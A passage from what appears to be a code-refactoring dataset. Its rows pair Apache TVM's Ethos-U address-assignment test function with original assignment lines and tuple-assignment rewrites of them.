                    npu_op.ofm.shape.height * npu_op.ofm.shape.width * npu_op.ofm.shape.depth
                )
                check_buffer(
                    npu_op.ofm.tiles.addresses[0],
                    npu_op.ofm.region,
                    ofm_length,
                    ofm_tir_buffer_var,
                )
                for idx, weight in enumerate(npu_op_tir_buffers[npu_op][2]):
                    assert isinstance(weight, vapi.NpuAddressRange)
                    check_buffer(
                        npu_op.weights[idx].address,
                        npu_op.weights[idx].region,
                        npu_op.weights[idx].length,
                        weight.address.buffer.data,
                    )
                for idx, bias in enumerate(npu_op_tir_buffers[npu_op][3]):
                    assert isinstance(bias, vapi.NpuAddressRange)
                    check_buffer(
                        npu_op.biases[idx].address,
                        npu_op.biases[idx].region,
                        npu_op.biases[idx].length,
                        bias.address.buffer.data,
                    )

    for test_case in test_cases:
        tir_mod = test_case[""tir_module""]
        tir_mod[""main""] = tir_mod[""main""].with_attr(""target"", tvm.target.Target(""ethos-u""))
        tir_mod = tvm.tir.transform.MakeUnpackedAPI()(tir_mod)
        candidate_regions_for_scratch = [5, 2, 1]
        (
            scratch_region_map,
            tvmbaw_workspace_size,
            _,
        ) = tir_to_cs_translator.analyze_scratch_memory_acesses(
            tir_mod, candidate_regions_for_scratch
        )
        allocate_node_sizes = _get_allocate_node_sizes(tir_mod)
        buffer_info = tir_to_cs_translator.extract_buffer_info(tir_mod, test_case[""param_dict""])
        extern_calls = extract_call_extern_list(tir_mod)
        _npu_ops = list()
        for extern_call in extern_calls:
            _npu_ops.append(tir_to_cs_translator.translate_ethosu_tir_call_extern(extern_call))
        npu_op_tir_buffers = collect_tir_buffer_info(_npu_ops)
        (_npu_ops, constant_hex_string) = tir_to_cs_translator.assign_addresses(
            buffer_info, _npu_ops, scratch_region_map
        )
        tvmbaw_workspace_mask = np.zeros(tvmbaw_workspace_size, dtype=""uint8"")
        constant_tensor_read_mask = np.zeros(len(constant_hex_string) // 2, dtype=""uint8"")
        verify(_npu_ops)
        # This will be only 1 if all allocated scratch is used.
        assert np.prod(tvmbaw_workspace_mask) == 1
        # This will be only 1 if all constant tensors is read at least once.
        assert np.prod(constant_tensor_read_mask) == 1","allocate_node_sizes = _get_allocate_node_sizes(tir_mod)
buffer_info = tir_to_cs_translator.extract_buffer_info(tir_mod, test_case['param_dict'])
extern_calls = extract_call_extern_list(tir_mod)
_npu_ops = list()","allocate_node_sizes , buffer_info , extern_calls , _npu_ops  = _get_allocate_node_sizes(tir_mod), tir_to_cs_translator.extract_buffer_info(tir_mod, test_case['param_dict']), extract_call_extern_list(tir_mod), list()"
tvm,https://github.com/apache/tvm/tree/master/tests/python/contrib/test_ethosu/test_tir_to_cs_translator.py,,test_assign_addresses$698,"def test_assign_addresses():
    test_cases = [
        {
            # Stimulus
            ""tir_module"": WeightStreamOnly,
            ""param_dict"": {
                WeightStreamOnly[""main""].attrs[""constants""][""buffer""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [128], ""uint8""
                ),
                WeightStreamOnly[""main""].attrs[""constants""][""buffer_1""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [32], ""uint8""
                ),
                WeightStreamOnly[""main""].attrs[""constants""][""buffer_2""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [112], ""uint8""
                ),
                WeightStreamOnly[""main""].attrs[""constants""][""buffer_3""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [32], ""uint8""
                ),
                WeightStreamOnly[""main""].attrs[""constants""][""buffer_4""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [112], ""uint8""
                ),
                WeightStreamOnly[""main""].attrs[""constants""][""buffer_5""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [32], ""uint8""
                ),
                WeightStreamOnly[""main""].attrs[""constants""][""buffer_6""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [112], ""uint8""
                ),
                WeightStreamOnly[""main""].attrs[""constants""][""buffer_7""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [32], ""uint8""
                ),
            },
        },
        {
            # Stimulus
            ""tir_module"": MixedRead,
            ""param_dict"": {
                MixedRead[""main""].attrs[""constants""][""buffer""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [592], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_1""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [160], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_2""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [80], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_3""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [32], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_4""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [80], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_5""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [32], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_6""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [80], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_7""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [32], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_8""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [80], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_9""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [32], ""uint8""
                ),
            },
        },
        {
            # Stimulus
            ""tir_module"": MixedConstantDatatypes,
            ""param_dict"": {
                MixedConstantDatatypes[""main""].attrs[""constants""][""buffer""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [160], ""uint8""
                ),
                MixedConstantDatatypes[""main""].attrs[""constants""][""buffer_2""]: np.random.randint(
                    np.iinfo(""int16"").min, np.iinfo(""int16"").max, [1], ""int16""
                ),
                MixedConstantDatatypes[""main""].attrs[""constants""][""buffer_1""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [272], ""uint8""
                ),
            },
        },
    ]

    def extract_call_extern_list(mod):
        """"""This function will obtain all ethosu_conv2d
        calls from a NPU TIR module
        Parameters
        ----------
        mod : tvm.IRModule
            This is a NPU TIR Module

        Returns
        -------
        list
            of tvm.tir.Call objects
            that are tir extern calls
            for ethosu_conv2d
        """"""
        # There should only be a single function
        assert len(mod.functions.items()) == 1
        primfunc = mod.functions.items()[0][1]

        extern_calls = list()

        def populate_extern_calls(stmt):
            if isinstance(stmt, tvm.tir.Call) and stmt.op.name == ""tir.call_extern"":
                extern_calls.append(stmt)

        stmt_functor.post_order_visit(primfunc.body, populate_extern_calls)
        return extern_calls

    def collect_tir_buffer_info(npu_ops):
        """"""This is run prior to address assigning to collect tir buffer information
        for verification later on""""""
        _npu_op_tir_buffers = dict()
        for npu_op in npu_ops:
            if isinstance(npu_op, vapi.NpuDmaOperation):
                _npu_op_tir_buffers[npu_op] = (npu_op.src.address, npu_op.dest.address)
            elif issubclass(type(npu_op), vapi.NpuBlockOperation):
                _npu_op_tir_buffers[npu_op] = (
                    npu_op.ifm.tiles.addresses[0],
                    npu_op.ofm.tiles.addresses[0],
                    npu_op.weights,
                    npu_op.biases,
                )
        return _npu_op_tir_buffers

    def _check_buffer(address, region, length, buffer_var):
        """"""Checks whether the buffer information is valid with
        original tir buffers.
        - If its constant, this will check
          the slice in the constant tensor has the values.
        - If its scratch, this will check
          the slice is within scratch and does not have conflicts
          with other scratch tensors.
        - If its input/output, this will check the
          address is zero
        """"""
        inverse_region_map = {
            0: tir_to_cs_translator.BufferType.constant,
            1: tir_to_cs_translator.BufferType.scratch,
            3: tir_to_cs_translator.BufferType.input,
            4: tir_to_cs_translator.BufferType.output,
        }
        buffer_type = inverse_region_map[region]
        buffer_dtype = buffer_var.type_annotation.element_type.dtype
        dtype_bytes = np.iinfo(np.dtype(buffer_dtype)).bits // 8
        if buffer_type == tir_to_cs_translator.BufferType.constant:
            ref = buffer_info[buffer_var].values
            hex_from = address * dtype_bytes * 2
            hex_to = hex_from + length * dtype_bytes * 2
            constant_hex = constant_hex_string[hex_from:hex_to]
            constant_tensor = np.frombuffer(bytearray.fromhex(constant_hex), dtype=buffer_dtype)
            np.array_equal(constant_tensor, ref)
            # Every buffer is adjusted to align to 16 bytes
            length = util.round_up(length, 16)
            # Mark these constants are read at least once
            constant_tensor_read_mask[address : address + length] = np.ones(
                length, dtype=buffer_dtype
            )
        elif buffer_type == tir_to_cs_translator.BufferType.scratch:
            assert address < tvmbaw_workspace_size

            size_in_bytes = allocate_node_sizes[buffer_var]
            # Every buffer is adjusted to align to 16 bytes
            size_in_bytes = util.round_up(size_in_bytes, 16)
            assert address + size_in_bytes <= tvmbaw_workspace_size
            # The scratch area should not be used by any other buffer
            assert not tvmbaw_workspace_mask[address : address + size_in_bytes].any()
            # The scratch area is marked as used
            tvmbaw_workspace_mask[address : address + size_in_bytes] = np.ones(
                size_in_bytes, dtype=""uint8""
            )
        elif buffer_type == tir_to_cs_translator.BufferType.input:
            assert address == 0
        else:
            assert buffer_type == tir_to_cs_translator.BufferType.output
            assert address == 0

    def _get_allocate_node_sizes(mod):
        # There should only be a single function
        assert len(mod.functions.items()) == 1
        primfunc = mod.functions.items()[0][1]
        _allocate_node_sizes = dict()

        def analyze_remaining_allocates(stmt):
            if isinstance(stmt, tvm.tir.stmt.Allocate):
                allocate = stmt
                pointer_type = allocate.buffer_var.type_annotation
                storage_scope = pointer_type.storage_scope
                if storage_scope == ""global"":
                    dtype_bytes = np.iinfo(np.dtype(allocate.dtype)).bits // 8
                    size_in_bytes = int(dtype_bytes * np.prod(list(allocate.extents)))
                    # Every memory address the NPU access have to be 16 byte aligned
                    size_in_bytes = util.round_up(size_in_bytes, 16)
                    _allocate_node_sizes[allocate.buffer_var] = size_in_bytes

        tvm.tir.stmt_functor.post_order_visit(primfunc.body, analyze_remaining_allocates)
        return _allocate_node_sizes

    def verify(npu_ops):
        """"""This wrapper verifies the allocated addresses matches with original tir buffers""""""
        checked_buffers = set()

        def check_buffer(address, region, length, buffer_var):
            if buffer_var not in checked_buffers:
                _check_buffer(address, region, length, buffer_var)
                checked_buffers.add(buffer_var)

        for npu_op in npu_ops:
            if isinstance(npu_op, vapi.NpuDmaOperation):
                src_tir_buffer_var = npu_op_tir_buffers[npu_op][0].buffer.data
                check_buffer(
                    npu_op.src.address, npu_op.src.region, npu_op.src.length, src_tir_buffer_var
                )
                dest_tir_load = npu_op_tir_buffers[npu_op][1].buffer.data
                check_buffer(
                    npu_op.dest.address,
                    npu_op.dest.region,
                    npu_op.dest.length,
                    dest_tir_load,
                )
            elif issubclass(type(npu_op), vapi.NpuBlockOperation):
                ifm_tir_buffer_var = npu_op_tir_buffers[npu_op][0].buffer.data
                ifm_length = (
                    npu_op.ifm.shape.height * npu_op.ifm.shape.width * npu_op.ifm.shape.depth
                )
                check_buffer(
                    npu_op.ifm.tiles.addresses[0],
                    npu_op.ifm.region,
                    ifm_length,
                    ifm_tir_buffer_var,
                )
                ofm_tir_buffer_var = npu_op_tir_buffers[npu_op][1].buffer.data
                ofm_length = (
                    npu_op.ofm.shape.height * npu_op.ofm.shape.width * npu_op.ofm.shape.depth
                )
                check_buffer(
                    npu_op.ofm.tiles.addresses[0],
                    npu_op.ofm.region,
                    ofm_length,
                    ofm_tir_buffer_var,
                )
                for idx, weight in enumerate(npu_op_tir_buffers[npu_op][2]):
                    assert isinstance(weight, vapi.NpuAddressRange)
                    check_buffer(
                        npu_op.weights[idx].address,
                        npu_op.weights[idx].region,
                        npu_op.weights[idx].length,
                        weight.address.buffer.data,
                    )
                for idx, bias in enumerate(npu_op_tir_buffers[npu_op][3]):
                    assert isinstance(bias, vapi.NpuAddressRange)
                    check_buffer(
                        npu_op.biases[idx].address,
                        npu_op.biases[idx].region,
                        npu_op.biases[idx].length,
                        bias.address.buffer.data,
                    )

    for test_case in test_cases:
        tir_mod = test_case[""tir_module""]
        tir_mod[""main""] = tir_mod[""main""].with_attr(""target"", tvm.target.Target(""ethos-u""))
        tir_mod = tvm.tir.transform.MakeUnpackedAPI()(tir_mod)
        candidate_regions_for_scratch = [5, 2, 1]
        (
            scratch_region_map,
            tvmbaw_workspace_size,
            _,
        ) = tir_to_cs_translator.analyze_scratch_memory_acesses(
            tir_mod, candidate_regions_for_scratch
        )
        allocate_node_sizes = _get_allocate_node_sizes(tir_mod)
        buffer_info = tir_to_cs_translator.extract_buffer_info(tir_mod, test_case[""param_dict""])
        extern_calls = extract_call_extern_list(tir_mod)
        _npu_ops = list()
        for extern_call in extern_calls:
            _npu_ops.append(tir_to_cs_translator.translate_ethosu_tir_call_extern(extern_call))
        npu_op_tir_buffers = collect_tir_buffer_info(_npu_ops)
        (_npu_ops, constant_hex_string) = tir_to_cs_translator.assign_addresses(
            buffer_info, _npu_ops, scratch_region_map
        )
        tvmbaw_workspace_mask = np.zeros(tvmbaw_workspace_size, dtype=""uint8"")
        constant_tensor_read_mask = np.zeros(len(constant_hex_string) // 2, dtype=""uint8"")
        verify(_npu_ops)
        # This will be only 1 if all allocated scratch is used.
        assert np.prod(tvmbaw_workspace_mask) == 1
        # This will be only 1 if all constant tensors is read at least once.
        assert np.prod(constant_tensor_read_mask) == 1","tvmbaw_workspace_mask = np.zeros(tvmbaw_workspace_size, dtype='uint8')
constant_tensor_read_mask = np.zeros(len(constant_hex_string) // 2, dtype='uint8')","tvmbaw_workspace_mask , constant_tensor_read_mask  = np.zeros(tvmbaw_workspace_size, dtype='uint8'), np.zeros(len(constant_hex_string) // 2, dtype='uint8')"
tvm,https://github.com/apache/tvm/tree/master/tests/python/contrib/test_ethosu/test_tir_to_cs_translator.py,,test_assign_addresses$698,"def test_assign_addresses():
    test_cases = [
        {
            # Stimulus
            ""tir_module"": WeightStreamOnly,
            ""param_dict"": {
                WeightStreamOnly[""main""].attrs[""constants""][""buffer""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [128], ""uint8""
                ),
                WeightStreamOnly[""main""].attrs[""constants""][""buffer_1""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [32], ""uint8""
                ),
                WeightStreamOnly[""main""].attrs[""constants""][""buffer_2""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [112], ""uint8""
                ),
                WeightStreamOnly[""main""].attrs[""constants""][""buffer_3""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [32], ""uint8""
                ),
                WeightStreamOnly[""main""].attrs[""constants""][""buffer_4""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [112], ""uint8""
                ),
                WeightStreamOnly[""main""].attrs[""constants""][""buffer_5""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [32], ""uint8""
                ),
                WeightStreamOnly[""main""].attrs[""constants""][""buffer_6""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [112], ""uint8""
                ),
                WeightStreamOnly[""main""].attrs[""constants""][""buffer_7""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [32], ""uint8""
                ),
            },
        },
        {
            # Stimulus
            ""tir_module"": MixedRead,
            ""param_dict"": {
                MixedRead[""main""].attrs[""constants""][""buffer""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [592], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_1""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [160], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_2""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [80], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_3""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [32], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_4""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [80], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_5""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [32], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_6""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [80], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_7""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [32], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_8""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [80], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_9""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [32], ""uint8""
                ),
            },
        },
        {
            # Stimulus
            ""tir_module"": MixedConstantDatatypes,
            ""param_dict"": {
                MixedConstantDatatypes[""main""].attrs[""constants""][""buffer""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [160], ""uint8""
                ),
                MixedConstantDatatypes[""main""].attrs[""constants""][""buffer_2""]: np.random.randint(
                    np.iinfo(""int16"").min, np.iinfo(""int16"").max, [1], ""int16""
                ),
                MixedConstantDatatypes[""main""].attrs[""constants""][""buffer_1""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [272], ""uint8""
                ),
            },
        },
    ]

    def extract_call_extern_list(mod):
        """"""This function will obtain all ethosu_conv2d
        calls from a NPU TIR module
        Parameters
        ----------
        mod : tvm.IRModule
            This is a NPU TIR Module

        Returns
        -------
        list
            of tvm.tir.Call objects
            that are tir extern calls
            for ethosu_conv2d
        """"""
        # There should only be a single function
        assert len(mod.functions.items()) == 1
        primfunc = mod.functions.items()[0][1]

        extern_calls = list()

        def populate_extern_calls(stmt):
            if isinstance(stmt, tvm.tir.Call) and stmt.op.name == ""tir.call_extern"":
                extern_calls.append(stmt)

        stmt_functor.post_order_visit(primfunc.body, populate_extern_calls)
        return extern_calls

    def collect_tir_buffer_info(npu_ops):
        """"""This is run prior to address assigning to collect tir buffer information
        for verification later on""""""
        _npu_op_tir_buffers = dict()
        for npu_op in npu_ops:
            if isinstance(npu_op, vapi.NpuDmaOperation):
                _npu_op_tir_buffers[npu_op] = (npu_op.src.address, npu_op.dest.address)
            elif issubclass(type(npu_op), vapi.NpuBlockOperation):
                _npu_op_tir_buffers[npu_op] = (
                    npu_op.ifm.tiles.addresses[0],
                    npu_op.ofm.tiles.addresses[0],
                    npu_op.weights,
                    npu_op.biases,
                )
        return _npu_op_tir_buffers

    def _check_buffer(address, region, length, buffer_var):
        """"""Checks whether the buffer information is valid with
        original tir buffers.
        - If its constant, this will check
          the slice in the constant tensor has the values.
        - If its scratch, this will check
          the slice is within scratch and does not have conflicts
          with other scratch tensors.
        - If its input/output, this will check the
          address is zero
        """"""
        inverse_region_map = {
            0: tir_to_cs_translator.BufferType.constant,
            1: tir_to_cs_translator.BufferType.scratch,
            3: tir_to_cs_translator.BufferType.input,
            4: tir_to_cs_translator.BufferType.output,
        }
        buffer_type = inverse_region_map[region]
        buffer_dtype = buffer_var.type_annotation.element_type.dtype
        dtype_bytes = np.iinfo(np.dtype(buffer_dtype)).bits // 8
        if buffer_type == tir_to_cs_translator.BufferType.constant:
            ref = buffer_info[buffer_var].values
            hex_from = address * dtype_bytes * 2
            hex_to = hex_from + length * dtype_bytes * 2
            constant_hex = constant_hex_string[hex_from:hex_to]
            constant_tensor = np.frombuffer(bytearray.fromhex(constant_hex), dtype=buffer_dtype)
            np.array_equal(constant_tensor, ref)
            # Every buffer is adjusted to align to 16 bytes
            length = util.round_up(length, 16)
            # Mark these constants are read at least once
            constant_tensor_read_mask[address : address + length] = np.ones(
                length, dtype=buffer_dtype
            )
        elif buffer_type == tir_to_cs_translator.BufferType.scratch:
            assert address < tvmbaw_workspace_size

            size_in_bytes = allocate_node_sizes[buffer_var]
            # Every buffer is adjusted to align to 16 bytes
            size_in_bytes = util.round_up(size_in_bytes, 16)
            assert address + size_in_bytes <= tvmbaw_workspace_size
            # The scratch area should not be used by any other buffer
            assert not tvmbaw_workspace_mask[address : address + size_in_bytes].any()
            # The scratch area is marked as used
            tvmbaw_workspace_mask[address : address + size_in_bytes] = np.ones(
                size_in_bytes, dtype=""uint8""
            )
        elif buffer_type == tir_to_cs_translator.BufferType.input:
            assert address == 0
        else:
            assert buffer_type == tir_to_cs_translator.BufferType.output
            assert address == 0

    def _get_allocate_node_sizes(mod):
        # There should only be a single function
        assert len(mod.functions.items()) == 1
        primfunc = mod.functions.items()[0][1]
        _allocate_node_sizes = dict()

        def analyze_remaining_allocates(stmt):
            if isinstance(stmt, tvm.tir.stmt.Allocate):
                allocate = stmt
                pointer_type = allocate.buffer_var.type_annotation
                storage_scope = pointer_type.storage_scope
                if storage_scope == ""global"":
                    dtype_bytes = np.iinfo(np.dtype(allocate.dtype)).bits // 8
                    size_in_bytes = int(dtype_bytes * np.prod(list(allocate.extents)))
                    # Every memory address the NPU access have to be 16 byte aligned
                    size_in_bytes = util.round_up(size_in_bytes, 16)
                    _allocate_node_sizes[allocate.buffer_var] = size_in_bytes

        tvm.tir.stmt_functor.post_order_visit(primfunc.body, analyze_remaining_allocates)
        return _allocate_node_sizes

    def verify(npu_ops):
        """"""This wrapper verifies the allocated addresses matches with original tir buffers""""""
        checked_buffers = set()

        def check_buffer(address, region, length, buffer_var):
            if buffer_var not in checked_buffers:
                _check_buffer(address, region, length, buffer_var)
                checked_buffers.add(buffer_var)

        for npu_op in npu_ops:
            if isinstance(npu_op, vapi.NpuDmaOperation):
                src_tir_buffer_var = npu_op_tir_buffers[npu_op][0].buffer.data
                check_buffer(
                    npu_op.src.address, npu_op.src.region, npu_op.src.length, src_tir_buffer_var
                )
                dest_tir_load = npu_op_tir_buffers[npu_op][1].buffer.data
                check_buffer(
                    npu_op.dest.address,
                    npu_op.dest.region,
                    npu_op.dest.length,
                    dest_tir_load,
                )
            elif issubclass(type(npu_op), vapi.NpuBlockOperation):
                ifm_tir_buffer_var = npu_op_tir_buffers[npu_op][0].buffer.data
                ifm_length = (
                    npu_op.ifm.shape.height * npu_op.ifm.shape.width * npu_op.ifm.shape.depth
                )
                check_buffer(
                    npu_op.ifm.tiles.addresses[0],
                    npu_op.ifm.region,
                    ifm_length,
                    ifm_tir_buffer_var,
                )
                ofm_tir_buffer_var = npu_op_tir_buffers[npu_op][1].buffer.data
                ofm_length = (
                    npu_op.ofm.shape.height * npu_op.ofm.shape.width * npu_op.ofm.shape.depth
                )
                check_buffer(
                    npu_op.ofm.tiles.addresses[0],
                    npu_op.ofm.region,
                    ofm_length,
                    ofm_tir_buffer_var,
                )
                for idx, weight in enumerate(npu_op_tir_buffers[npu_op][2]):
                    assert isinstance(weight, vapi.NpuAddressRange)
                    check_buffer(
                        npu_op.weights[idx].address,
                        npu_op.weights[idx].region,
                        npu_op.weights[idx].length,
                        weight.address.buffer.data,
                    )
                for idx, bias in enumerate(npu_op_tir_buffers[npu_op][3]):
                    assert isinstance(bias, vapi.NpuAddressRange)
                    check_buffer(
                        npu_op.biases[idx].address,
                        npu_op.biases[idx].region,
                        npu_op.biases[idx].length,
                        bias.address.buffer.data,
                    )

    for test_case in test_cases:
        tir_mod = test_case[""tir_module""]
        tir_mod[""main""] = tir_mod[""main""].with_attr(""target"", tvm.target.Target(""ethos-u""))
        tir_mod = tvm.tir.transform.MakeUnpackedAPI()(tir_mod)
        candidate_regions_for_scratch = [5, 2, 1]
        (
            scratch_region_map,
            tvmbaw_workspace_size,
            _,
        ) = tir_to_cs_translator.analyze_scratch_memory_acesses(
            tir_mod, candidate_regions_for_scratch
        )
        allocate_node_sizes = _get_allocate_node_sizes(tir_mod)
        buffer_info = tir_to_cs_translator.extract_buffer_info(tir_mod, test_case[""param_dict""])
        extern_calls = extract_call_extern_list(tir_mod)
        _npu_ops = list()
        for extern_call in extern_calls:
            _npu_ops.append(tir_to_cs_translator.translate_ethosu_tir_call_extern(extern_call))
        npu_op_tir_buffers = collect_tir_buffer_info(_npu_ops)
        (_npu_ops, constant_hex_string) = tir_to_cs_translator.assign_addresses(
            buffer_info, _npu_ops, scratch_region_map
        )
        tvmbaw_workspace_mask = np.zeros(tvmbaw_workspace_size, dtype=""uint8"")
        constant_tensor_read_mask = np.zeros(len(constant_hex_string) // 2, dtype=""uint8"")
        verify(_npu_ops)
        # This will be only 1 if all allocated scratch is used.
        assert np.prod(tvmbaw_workspace_mask) == 1
        # This will be only 1 if all constant tensors is read at least once.
        assert np.prod(constant_tensor_read_mask) == 1","ref = buffer_info[buffer_var].values
hex_from = address * dtype_bytes * 2","ref , hex_from  = buffer_info[buffer_var].values, address * dtype_bytes * 2"
tvm,https://github.com/apache/tvm/tree/master/tests/python/contrib/test_ethosu/test_tir_to_cs_translator.py,,test_assign_addresses$698,"def test_assign_addresses():
    test_cases = [
        {
            # Stimulus
            ""tir_module"": WeightStreamOnly,
            ""param_dict"": {
                WeightStreamOnly[""main""].attrs[""constants""][""buffer""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [128], ""uint8""
                ),
                WeightStreamOnly[""main""].attrs[""constants""][""buffer_1""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [32], ""uint8""
                ),
                WeightStreamOnly[""main""].attrs[""constants""][""buffer_2""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [112], ""uint8""
                ),
                WeightStreamOnly[""main""].attrs[""constants""][""buffer_3""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [32], ""uint8""
                ),
                WeightStreamOnly[""main""].attrs[""constants""][""buffer_4""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [112], ""uint8""
                ),
                WeightStreamOnly[""main""].attrs[""constants""][""buffer_5""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [32], ""uint8""
                ),
                WeightStreamOnly[""main""].attrs[""constants""][""buffer_6""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [112], ""uint8""
                ),
                WeightStreamOnly[""main""].attrs[""constants""][""buffer_7""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [32], ""uint8""
                ),
            },
        },
        {
            # Stimulus
            ""tir_module"": MixedRead,
            ""param_dict"": {
                MixedRead[""main""].attrs[""constants""][""buffer""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [592], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_1""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [160], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_2""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [80], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_3""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [32], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_4""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [80], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_5""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [32], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_6""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [80], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_7""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [32], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_8""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [80], ""uint8""
                ),
                MixedRead[""main""].attrs[""constants""][""buffer_9""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [32], ""uint8""
                ),
            },
        },
        {
            # Stimulus
            ""tir_module"": MixedConstantDatatypes,
            ""param_dict"": {
                MixedConstantDatatypes[""main""].attrs[""constants""][""buffer""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [160], ""uint8""
                ),
                MixedConstantDatatypes[""main""].attrs[""constants""][""buffer_2""]: np.random.randint(
                    np.iinfo(""int16"").min, np.iinfo(""int16"").max, [1], ""int16""
                ),
                MixedConstantDatatypes[""main""].attrs[""constants""][""buffer_1""]: np.random.randint(
                    np.iinfo(""uint8"").min, np.iinfo(""uint8"").max, [272], ""uint8""
                ),
            },
        },
    ]

    def extract_call_extern_list(mod):
        """"""This function will obtain all ethosu_conv2d
        calls from a NPU TIR module
        Parameters
        ----------
        mod : tvm.IRModule
            This is a NPU TIR Module

        Returns
        -------
        list
            of tvm.tir.Call objects
            that are tir extern calls
            for ethosu_conv2d
        """"""
        # There should only be a single function
